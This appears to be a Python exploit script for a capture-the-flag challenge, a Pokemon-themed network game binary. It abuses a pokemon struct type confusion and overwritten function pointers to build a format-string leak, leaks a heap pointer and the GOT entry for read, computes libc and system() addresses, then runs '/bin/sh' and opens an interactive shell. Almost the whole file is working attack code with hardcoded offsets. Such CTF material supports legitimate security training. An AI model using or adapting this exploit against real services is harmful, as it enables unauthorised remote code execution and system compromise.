from isis import *
import re
s=get_socket(('localhost',2323))

#s=get_socket(('54.80.112.128',1313))
poke_array          = 0x804BFAC
kk_printer          = 0x8048766
read_got            = 0x804aeb4
printf_plt          = 0x8048520
printer_offset      = 0x210-0xf 
attack_name_offset  = 0x20C-0xf

charizard_pic_sz    = 0x850

encounter_counter   = 0
capture_counter     = 1 #bird jesus

#local
read_offset   = 0x000df210
system_offset = 0x0003f430

#remote
#system_offset = 0x003b990
#read_offset   = 0x00c6e90


def do_grass(s): #huehuehuhue
	global encounter_counter
	global capture_counter
	s.send('1\n') #enter the grass
	time.sleep(4)
	if  encounter_counter&1==1 and encounter_counter!=12:
		if capture_counter<5:
			s.send('2\n') #pokeball
			#need to name
			s.send('pikachu_packet') #14 chars
			capture_counter+=1
		else:
			s.send('1\n') # kill
	elif encounter_counter==12:
		#charizard
		#attack 4 times (80 pts dmg)
		s.send('1\n')
		s.send('1\n')
		s.send('1\n')
		s.send('1\n')
		s.send('2\n') #capture (health reduced to 20)
		s.send('/bin/sh;%5$p\n')
		#we need to replace a pokeman
		#vuln here: 0x8048BD7
		#pokemon struct confusion
		time.sleep(.5)
		s.send('5\n') #the most recent capture
	time.sleep(1)
	encounter_counter+=1
	return s.recv(0x100000)

def inspect(s):
	#inspecting pokemon calls a function pointer inside each pokemon
	s.send('3\n')
	time.sleep(2)
	return s.recv(0x10000)


def generate_bad_pic(pointer,func,beginning=None):
	if beginning==None:
		beginning=0x41414141
	leak_read_art=(lei(beginning)+'A'*(attack_name_offset-4)+lei(pointer)+
				   lei(func))
	leak_read_art=(leak_read_art+
		        'A'*(charizard_pic_sz-len(leak_read_art)))
	return leak_read_art


def use_confusion(s):
	#just a wrapper to catch charizard and replace a kakuna
	#triggering the vulnerability
	output=[]
	for i in range(13):
		output.append(do_grass(s))
		print '%s'%i
	return ''.join(output)

def change_artwork(s,artwork):
	s.send('5\n') #char artwork option
	s.send('5\n') #the confused pokeman	
	s.send(artwork)


print use_confusion(s)

#Manupulate my confused charizard so it tells me where it's address is.
#We do this by manufacturing an uncontrolled format string vulnerability.
change_artwork(s,
	generate_bad_pic(poke_array,printf_plt)
	)

#trigger the uncontrolled format string vulnerability
info_w_my_block=inspect(s) 

print info_w_my_block

#use a regular expression to find the pointer we leaked
my_pokemon=int(re.findall('0x\w*',info_w_my_block)[0],16)

#Manupulate my confused charizard so it leaks the GOT.
#We do this by replacing the name pointer with a GOT pointer.
change_artwork(s,
	generate_bad_pic(my_pokemon+0xf,kk_printer,read_got)
	)

info_w_got=inspect(s)

print info_w_got
#use the leaked GOT pointer to find libc base address and system
read_ptr   = ulei(re.findall('(Attack: )(.{4})',info_w_got)[-1][1])[0]
libc       = read_ptr - read_offset
system_ptr = libc + system_offset


print 'libc: %s'   % hex(libc)
print 'read: %s'   % hex(read_ptr)
print 'system: %s' % hex(system_ptr)


change_artwork(s,
	generate_bad_pic(poke_array,system_ptr)
	)

final_inspection=inspect(s) #call system
print final_inspection

#interact with out shell.
print 'https://www.youtube.com/watch?v=TZOXdQP2H8M'
telnet_shell(s)


'''
Hex dump of section '.comment':
  0x00000000 4743433a 20284465 6269616e 20342e37 GCC: (Debian 4.7
  0x00000010 2e322d35 2920342e 372e3200 4743433a .2-5) 4.7.2.GCC:
  0x00000020 20284465 6269616e 20342e34 2e372d32  (Debian 4.4.7-2
  0x00000030 2920342e 342e3700                   ) 4.4.7.
'''
